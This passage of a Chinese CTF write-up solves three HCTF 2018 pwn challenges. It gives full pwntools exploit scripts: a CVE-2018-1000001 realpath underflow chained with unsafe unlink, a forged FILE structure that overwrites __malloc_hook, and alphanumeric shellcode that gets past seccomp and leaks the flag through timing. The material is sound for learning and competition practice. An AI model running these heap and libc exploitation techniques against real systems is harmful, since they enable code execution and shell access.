<p>根据hint提示，要用libc-2.23_9 ，我虚拟机的是libc-2.23_10，然后去找了下change log<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+  * SECURITY UPDATE: Buffer underflow in realpath()</span><br><span class="line">+    - debian/patches/any/cvs-make-getcwd-fail-if-path-is-no-absolute.diff:</span><br><span class="line">+      Make getcwd(3) fail if it cannot obtain an absolute path</span><br><span class="line">+    - CVE-2018-1000001</span><br></pre></td></tr></table></figure></p>
<p>发现realpath有一个overflow </p>
<p>所以大概关键就在canonicalize_file_name这个函数这里</p>
<p><a href="https://paper.seebug.org/528/" target="_blank" rel="noopener">https://paper.seebug.org/528/</a></p>
<p>就是CVE–2018-1000001</p>
<p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Pwn/easyexp_00.png" alt></p>
<p>（之前就想拿这个CVE来出题……..可惜怕被当成kernel题就没敢出<br>（没复现CVE，现在要去看一遍源码…….</p>
<p>一开始输入名字的时候输入(unreachable)，然后在里面创建一个tmp文件，这样就可以绕过realpath 里面的一个检查</p>
<p>利用的话是改chunk size，unsafe unlink，再拿到任意读写，get shell（话说好久没碰到要用unsafe unlink的题，都生疏了……….</p>
<p>payload 如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">e=ELF(<span class="string">'./libc-2.23_9.so'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    <span class="comment">#p=process('./easyexp')</span></span><br><span class="line">    p=process(<span class="string">'./easyexp'</span>,env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc-2.23_9.so'</span>&#125;)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'150.109.46.159'</span>, <span class="number">20004</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mkfile</span><span class="params">(name,content)</span>:</span></span><br><span class="line">    sl(<span class="string">'mkfile '</span>+name)</span><br><span class="line">    ru(<span class="string">'write something:'</span>)</span><br><span class="line">    sl(content)</span><br><span class="line">    ru(<span class="string">'$'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cat</span><span class="params">(name)</span>:</span></span><br><span class="line">    sl(<span class="string">'cat '</span>+name)</span><br><span class="line">    <span class="keyword">return</span> ru(<span class="string">'$'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> debug:</span><br><span class="line">    ru(<span class="string">'Input your token:'</span>)</span><br><span class="line">    sl(<span class="string">'uvm73jg2AFMECo71DIZRZh39MRqFOI2w'</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">"input your home's name: "</span>)</span><br><span class="line">se(<span class="string">'(unreachable)\n'</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'$'</span>)</span><br><span class="line">mkfile(<span class="string">'(unreachable)/tmp'</span>,<span class="string">'a'</span>*<span class="number">0x16</span>+<span class="string">'/'</span>)</span><br><span class="line">mkfile(<span class="string">'2'</span>,<span class="string">'a'</span>*<span class="number">0x27</span>)</span><br><span class="line">mkfile(<span class="string">'3'</span>,<span class="string">'a'</span>*<span class="number">0x37</span>)</span><br><span class="line">mkfile(<span class="string">'3'</span>,p64(<span class="number">0x21</span>)*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">'mkdir ../../../../a\x41'</span>)</span><br><span class="line">cat(<span class="string">'(unreachable)/tmp'</span>)</span><br><span class="line"></span><br><span class="line">mkfile(<span class="string">'4'</span>,<span class="string">'a'</span>*<span class="number">0x37</span>)</span><br><span class="line"></span><br><span class="line">mkfile(<span class="string">'4'</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x6031e0</span><span class="number">-0x18</span>+<span class="number">1</span>)+p64(<span class="number">0x6031e0</span><span class="number">-0x10</span>)+p64(<span class="number">0x20</span>)+p64(<span class="number">0x41</span>))</span><br><span class="line"></span><br><span class="line">mkfile(<span class="string">'5'</span>,<span class="string">'1'</span>*<span class="number">0x27</span>)</span><br><span class="line">cat(<span class="string">'4'</span>)</span><br><span class="line">mkfile(<span class="string">'6'</span>,<span class="string">'a'</span>*<span class="number">0x37</span>)</span><br><span class="line">mkfile(<span class="string">'6'</span>,p64(<span class="number">0x21</span>)*<span class="number">6</span>)</span><br><span class="line">mkfile(<span class="string">'7'</span>,<span class="string">'a'</span>*<span class="number">0x37</span>)</span><br><span class="line">mkfile(<span class="string">'7'</span>,p64(<span class="number">0x21</span>)*<span class="number">6</span>)</span><br><span class="line">cat(<span class="string">'6'</span>)</span><br><span class="line">mkfile(<span class="string">'77'</span>,<span class="string">'a'</span>*<span class="number">0x27</span>)</span><br><span class="line">mkfile(<span class="string">'77'</span>,p64(<span class="number">0x21</span>)*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mkfile(<span class="string">'4'</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x6031e0</span><span class="number">-0x18</span>)+p64(<span class="number">0x6031e0</span><span class="number">-0x10</span>)+p64(<span class="number">0x20</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line"></span><br><span class="line">mkfile(<span class="string">'8'</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">mkfile(<span class="string">'4'</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+p64(<span class="number">0x603180</span>)+p32(<span class="number">0x200</span>)[:<span class="number">2</span>])</span><br><span class="line">mkfile(<span class="string">'4'</span>,p64(<span class="number">0x603018</span>)+p32(<span class="number">0x200</span>)[:<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">data=cat(<span class="string">'77'</span>)</span><br><span class="line">base=u64(data[<span class="number">1</span>:<span class="number">7</span>]+<span class="string">'\x00\x00'</span>)-e.symbols[<span class="string">'free'</span>]</span><br><span class="line">system = base+e.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">mkfile(<span class="string">'77'</span>,p64(system)[:<span class="number">6</span>])</span><br><span class="line">cat(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">'mkfile 99'</span>)</span><br><span class="line"></span><br><span class="line">print(hex(base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>flag:hctf{53e3b00dc29b152d1740f042ae4efce199785f7acaa062c21d600e67f811d276}</code></p>
</blockquote>
<h2 id="baby-printf-ver2"><a href="#baby-printf-ver2" class="headerlink" title="baby printf ver2"></a>baby printf ver2</h2><p>首先利用任意读把libc地址泄漏出来，<br>然后任意写，写<code>__malloc_hook</code><br>再输入<code>%n</code>，报错，报错的时候会调用malloc，get shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">e=ELF(<span class="string">'./libc64.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    <span class="comment">#p=process('./babyprintf_ver2')</span></span><br><span class="line">    p=process(<span class="string">'./babyprintf_ver2'</span>,env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc64.so'</span>&#125;)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'150.109.44.250'</span>, <span class="number">20005</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> debug:</span><br><span class="line">    ru(<span class="string">'Input your token:'</span>)</span><br><span class="line">    se(<span class="string">'uvm73jg2AFMECo71DIZRZh39MRqFOI2w\n'</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'So I change the buffer location to '</span>)</span><br><span class="line"></span><br><span class="line">buffer=int(ru(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">pbase=buffer<span class="number">-0x202010</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">'Have fun!'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = p64(<span class="number">0xfbad2887</span>) + p64(pbase+<span class="number">0x201FB0</span>)</span><br><span class="line">file+= p64(buffer+<span class="number">0xf0</span>) +p64(buffer+<span class="number">0xf0</span>)</span><br><span class="line">file+= p64(buffer+<span class="number">0xf0</span>) +p64(buffer+<span class="number">0xf8</span>)</span><br><span class="line">file+= p64(buffer+<span class="number">0xf0</span>) +p64(pbase+<span class="number">0x201FB0</span>)</span><br><span class="line">file+= p64(pbase+<span class="number">0x201FB0</span>+<span class="number">8</span>) +p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(<span class="number">0</span>) +p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(<span class="number">0</span>) +p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(<span class="number">1</span>) +p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">file+= p64(<span class="number">0</span>) +p64(buffer+<span class="number">0x200</span>)</span><br><span class="line">file+= p64(<span class="number">0xffffffffffffffff</span>) +p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(buffer+<span class="number">0x210</span>) +p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(<span class="number">0</span>) +p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(<span class="number">0x00000000ffffffff</span>)+p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(<span class="number">0</span>) +p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">se(p64(<span class="number">0xdeadbeef</span>)*<span class="number">2</span>+p64(buffer+<span class="number">0x18</span>)+file+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'permitted!\n'</span>)</span><br><span class="line">libc=u64(ru(<span class="string">'\x00\x00'</span>))</span><br><span class="line"></span><br><span class="line">base=libc<span class="number">-0x3E82A0</span></span><br><span class="line"></span><br><span class="line">malloc_hook=base+e.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">file = p64(<span class="number">0xfbad2887</span>) + p64(malloc_hook)</span><br><span class="line">file+= p64(malloc_hook) +p64(malloc_hook)</span><br><span class="line">file+= p64(malloc_hook) +p64(malloc_hook)</span><br><span class="line">file+= p64(malloc_hook+<span class="number">8</span>) +p64(pbase+<span class="number">0x201FB0</span>)</span><br><span class="line">file+= p64(pbase+<span class="number">0x201FB0</span>) +p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(<span class="number">0</span>) +p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(<span class="number">0</span>) +p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(<span class="number">1</span>) +p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">file+= p64(<span class="number">0</span>) +p64(buffer+<span class="number">0x220</span>)</span><br><span class="line">file+= p64(<span class="number">0xffffffffffffffff</span>) +p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(buffer+<span class="number">0x230</span>) +p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(<span class="number">0</span>) +p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(<span class="number">0x00000000ffffffff</span>)+p64(<span class="number">0</span>)</span><br><span class="line">file+= p64(<span class="number">0</span>) +p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">se(p64(base+<span class="number">0x4f322</span>)*<span class="number">2</span>+p64(buffer+<span class="number">0x18</span>)+file+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">se(<span class="string">'%n\n'</span>)</span><br><span class="line"></span><br><span class="line">print(hex(pbase))</span><br><span class="line">print(hex(libc))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="christmas"><a href="#christmas" class="headerlink" title="christmas"></a>christmas</h2><p>写shellcode，有seccomp</p>
<p>seccomp 限制了只能执行exit和exit_group 这两个syscall</p>
<p>还限制了只能字母和数字，这个限制可以用alpha3突破（非灰也师傅帮忙修好了，能在linux下面跑</p>
<p>程序没开pie，因此能在程序那里拿到libc的地址，然后找libc base</p>
<p>base找到了之后，倒着去搜libflag.so里面bss段的_DYNAMIC</p>
<p>在里面可以找到DT_STRTAB和DT_SYMTAB，然后搜flag_yes_1337，根据偏移再找到<br>Elf64_Sym 结构体，最后找到flag_yes_1337函数的地址，call一下拿到flag，然后再盲注出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pwnlib.shellcraft.amd64 <span class="keyword">as</span> sc</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">payload=asm(sc.mov(<span class="string">'rdi'</span>,<span class="number">0x602030</span>))+\</span><br><span class="line">asm(<span class="string">"mov rdi,[rdi]"</span>) +\</span><br><span class="line">asm(sc.mov(<span class="string">'rdx'</span>,<span class="number">0x6f690</span>)) +\</span><br><span class="line">asm(<span class="string">'sub rdi,rdx'</span>)+ \</span><br><span class="line">asm(sc.mov(<span class="string">'rbx'</span>,<span class="string">'rdi'</span>)) +\</span><br><span class="line">asm(sc.push(<span class="number">0x6FFFFEF5</span>))+\</span><br><span class="line">asm(<span class="string">'''</span></span><br><span class="line"><span class="string">search:</span></span><br><span class="line"><span class="string">    push 4</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    mov rdi,rbx</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    repe cmpsb</span></span><br><span class="line"><span class="string">    jz  done</span></span><br><span class="line"><span class="string">    sub rbx,1</span></span><br><span class="line"><span class="string">    jnz search </span></span><br><span class="line"><span class="string">done: </span></span><br><span class="line"><span class="string">'''</span>)+\</span><br><span class="line">asm(<span class="string">'add rdi,0x14'</span>)+\</span><br><span class="line">asm(<span class="string">'mov r10,[rdi]'</span>)+\</span><br><span class="line">asm(<span class="string">'add rdi,0x10'</span>)+\</span><br><span class="line">asm(<span class="string">'mov r11,[rdi]'</span>)+\</span><br><span class="line">asm(<span class="string">'sub rdi,0x40'</span>)+\</span><br><span class="line">asm(<span class="string">'mov rcx,[rdi]'</span>)+\</span><br><span class="line">asm(<span class="string">'sub rbx,rcx'</span>)+\</span><br><span class="line">asm(sc.mov(<span class="string">'rcx'</span>,<span class="number">0x80</span>))+\</span><br><span class="line">asm(<span class="string">'sub rbx,rcx'</span>)+\</span><br><span class="line">asm(<span class="string">'mov r12,rbx'</span>)+\</span><br><span class="line">asm(sc.pushstr(<span class="string">'flag_yes_'</span>))+\</span><br><span class="line">asm(<span class="string">'mov rbx,r10'</span>)+\</span><br><span class="line">asm(<span class="string">'''</span></span><br><span class="line"><span class="string">search:</span></span><br><span class="line"><span class="string">    push 8</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    mov rdi,rbx</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    repe cmpsb</span></span><br><span class="line"><span class="string">    jz  done</span></span><br><span class="line"><span class="string">    add rbx,1</span></span><br><span class="line"><span class="string">    jnz search </span></span><br><span class="line"><span class="string">done: </span></span><br><span class="line"><span class="string">'''</span>)+\</span><br><span class="line">asm(<span class="string">'sub rdi,0x8'</span>)+\</span><br><span class="line">asm(<span class="string">'sub rdi,r10'</span>)+\</span><br><span class="line">asm(<span class="string">'push rdi'</span>)+\</span><br><span class="line">asm(<span class="string">'mov rbx,r11'</span>)+\</span><br><span class="line">asm(<span class="string">'''</span></span><br><span class="line"><span class="string">search:</span></span><br><span class="line"><span class="string">    push 3</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    mov rdi,rbx</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    repe cmpsb</span></span><br><span class="line"><span class="string">    jz  done</span></span><br><span class="line"><span class="string">    add rbx,1</span></span><br><span class="line"><span class="string">    jnz search </span></span><br><span class="line"><span class="string">done: </span></span><br><span class="line"><span class="string">'''</span>)+\</span><br><span class="line">asm(<span class="string">'add rdi,5'</span>)+\</span><br><span class="line">asm(<span class="string">'mov rdi,[rdi]'</span>)+\</span><br><span class="line">asm(<span class="string">'add rdi,r12'</span>)+\</span><br><span class="line">asm(<span class="string">'call rdi'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(idx,c)</span>:</span></span><br><span class="line">    tmp=payload+\</span><br><span class="line">    asm(<span class="string">'''</span></span><br><span class="line"><span class="string">    add al,%d</span></span><br><span class="line"><span class="string">    xor rbx,rbx</span></span><br><span class="line"><span class="string">    xor rcx,rcx</span></span><br><span class="line"><span class="string">    mov bl,[rax]</span></span><br><span class="line"><span class="string">    add cl,%d</span></span><br><span class="line"><span class="string">    cmp rbx,rcx</span></span><br><span class="line"><span class="string">    jz done</span></span><br><span class="line"><span class="string">    xor rax,rax</span></span><br><span class="line"><span class="string">    add al,60</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    done:</span></span><br><span class="line"><span class="string">    '''</span>%(idx,c))+asm(sc.infloop())</span><br><span class="line"></span><br><span class="line">    print(idx,c)</span><br><span class="line">    f=open(<span class="string">'alapayload'</span>,<span class="string">'wb'</span>)</span><br><span class="line">    f.write(tmp)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute</span><span class="params">(idx,c)</span>:</span></span><br><span class="line">    debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#context.log_level='debug'</span></span><br><span class="line">    context.arch=<span class="string">'amd64'</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        p=process(<span class="string">'./christmas'</span>)</span><br><span class="line">        <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">        <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">'150.109.46.159'</span>, <span class="number">20003</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">        p.send(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> debug:</span><br><span class="line">        ru(<span class="string">'Input your token:'</span>)</span><br><span class="line">        se(<span class="string">'uvm73jg2AFMECo71DIZRZh39MRqFOI2w\n'</span>)</span><br><span class="line">    payload=<span class="string">'42'</span></span><br><span class="line">    generate(idx,c)</span><br><span class="line">    a=os.popen(<span class="string">'python ./alpha3/ALPHA3.py x64 ascii mixedcase RAX --input="alapayload"'</span>)</span><br><span class="line">    payload+=a.read()</span><br><span class="line">    a.close()</span><br><span class="line">    se(payload)</span><br><span class="line">    ru(<span class="string">'can you tell me how to find it??'</span>)</span><br><span class="line">    start=time.time()</span><br><span class="line">    p.can_recv_raw(timeout=<span class="number">3</span>)</span><br><span class="line">    p.close()</span><br><span class="line">    end=time.time()</span><br><span class="line">    <span class="keyword">if</span> end-start&gt;<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str=<span class="string">'&#123;&#125;_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+!@#$%^&amp;*()'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#brute(4,ord('&#123;'))</span></span><br><span class="line">flag=<span class="string">'&#123;dyn_15_4w'</span></span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> range(<span class="number">14</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(str)):</span><br><span class="line">        <span class="keyword">if</span> brute(q,ord(str[i])):</span><br><span class="line">            raw_input(str[i])</span><br><span class="line">            flag+=str[i]</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/De1ta-team/pic/master/HCTF2018_Qual/Pwn/christmas_00.png" alt></p>
<blockquote>
<p><code>flag:HCTF{dyn_15_4w350m3}</code></p>
</blockquote>
